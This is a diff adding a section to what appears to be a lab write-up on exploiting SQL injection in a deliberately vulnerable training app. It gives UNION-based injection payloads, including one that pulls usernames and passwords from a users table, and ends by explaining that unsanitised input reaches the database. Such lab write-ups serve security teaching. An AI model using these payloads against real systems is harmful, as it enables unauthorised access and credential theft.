@@ -110,3 +110,17 @@ SELECT firstname, lastname FROM users WHERE user_id = 1 or 1=1 UNION SELECT user
 
 ![image](https://github.com/user-attachments/assets/6d69cc5b-cdf6-41ec-8b0f-13a950b9aa42)
 
+## Security Level: High
+
+Use the crafted input similar to the one that we used in security level: Low.
+
+```bash
+1' UNION SELECT user,password FROM users#
+```
+
+![image](https://github.com/user-attachments/assets/a095e9be-f1aa-4fb0-8db5-0a1861d4e297)
+
+
+---
+
+Attacker is able to exploit this SQL Injection vulnerability because the input parameters supplied by the users are directly passed to the database to retreive information back to the application. 
